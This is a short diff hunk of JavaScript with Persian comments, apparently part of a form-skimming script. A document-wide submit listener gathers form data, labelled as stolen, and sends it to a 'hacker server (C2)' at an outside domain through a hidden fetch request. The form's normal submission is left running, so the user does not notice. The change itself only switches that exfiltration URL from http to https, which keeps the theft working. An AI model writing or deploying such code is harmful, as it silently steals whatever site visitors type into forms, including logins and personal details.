@@ -15,7 +15,7 @@ document.addEventListener('submit', function(e) {
     console.log("🕵️ در حال سرقت اطلاعات: ", stolenData);
 
     // آدرس سرور هکر (C2)
-    let hackerUrl = 'http://hackerapp.eitebar.ir/stealer?data=' + encodeURIComponent(JSON.stringify(stolenData));
+    let hackerUrl = 'https://hackerapp.eitebar.ir/stealer?data=' + encodeURIComponent(JSON.stringify(stolenData));
 
     // ارسال مخفیانه اطلاعات بدون متوقف کردن روند عادی فرم
     fetch(hackerUrl, {
